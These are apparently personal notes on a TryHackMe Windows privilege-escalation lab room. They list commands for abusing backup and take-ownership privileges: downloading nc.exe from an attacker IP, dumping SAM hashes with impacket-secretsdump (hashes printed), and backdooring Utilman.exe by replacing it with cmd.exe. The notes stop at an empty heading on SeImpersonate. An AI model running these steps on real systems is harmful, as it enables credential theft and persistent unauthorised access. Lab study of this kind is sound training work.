# Windows Privilege Escalation via User Privileges | Real World Technique

# TryHackMe Room

```powershell
https://tryhackme.com/room/windowsprivesc20
```

## By connecting with Remmina

![image.png](Windows%20Privilege%20Escalation%20via%20User%20Privileges%20R/image.png)

## Technique No 1

```powershell
whoami
whoami /priv
```

![image.png](Windows%20Privilege%20Escalation%20via%20User%20Privileges%20R/image%201.png)

**SeBackupPriv = read every file on the system**

**SeRestorPriv = read and write every file on the system**

![image.png](Windows%20Privilege%20Escalation%20via%20User%20Privileges%20R/image%202.png)

![image.png](Windows%20Privilege%20Escalation%20via%20User%20Privileges%20R/image%203.png)

# Transfer those files for decoding

Google = nc download from GitHub

![image.png](Windows%20Privilege%20Escalation%20via%20User%20Privileges%20R/image%204.png)

Powershell

```powershell
Invoke-WebRequest -Url http://ip/nc.exe -OutFile nc.exe
```

![image.png](Windows%20Privilege%20Escalation%20via%20User%20Privileges%20R/image%205.png)

cmd

![image.png](Windows%20Privilege%20Escalation%20via%20User%20Privileges%20R/image%206.png)

![image.png](Windows%20Privilege%20Escalation%20via%20User%20Privileges%20R/image%207.png)

```powershell
impacket-secretsdump LOCAL -sam SAM -system SYSTEM
```

Output

```powershell
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b1404ee:8f81ee5558e2d1205a84d07b0e3b34f5:::
Guest:501:aad3b435b51404eeaad3b435b1404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b1404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b1404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
THMBackup:1008:aad3b435b51404eeaad3b435b1404ee:6c252027fb2022f5051e854e08023537:::
THMTakeOwnership:1009:aad3b435b51404eeaad3b435b1404ee:0af9b65477395b680b822e0b2c45b93b:::
[*] Cleaning up ...

```

![Screenshot From 2026-09-03 09-28-37.png](Windows%20Privilege%20Escalation%20via%20User%20Privileges%20R/Screenshot_From_2026-09-03_09-28-37.png)

## Technique No 2

**Se Take Ownership**

![image.png](Windows%20Privilege%20Escalation%20via%20User%20Privileges%20R/image%208.png)

### Change Ownership

```powershell
C:\Windows\system32>takeown /f C:\Windows\System32\Utilman.exe

```

**Lock Profile**

**then Utilman**

![image.png](Windows%20Privilege%20Escalation%20via%20User%20Privileges%20R/image%209.png)

![image.png](Windows%20Privilege%20Escalation%20via%20User%20Privileges%20R/image%2010.png)

![image.png](Windows%20Privilege%20Escalation%20via%20User%20Privileges%20R/image%2011.png)

```powershell
icacls C:\Windows\System32\Utilman.exe /grant thmtakeownership:F
```

**Action Performed**

The user has executed the binary replacement command to finalize the backdoor setup.

```powershell
C:\Windows\system32>copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe /Y

```

![image.png](Windows%20Privilege%20Escalation%20via%20User%20Privileges%20R/image%2012.png)

# **SeImpersonate / SeAssignPrimaryToken**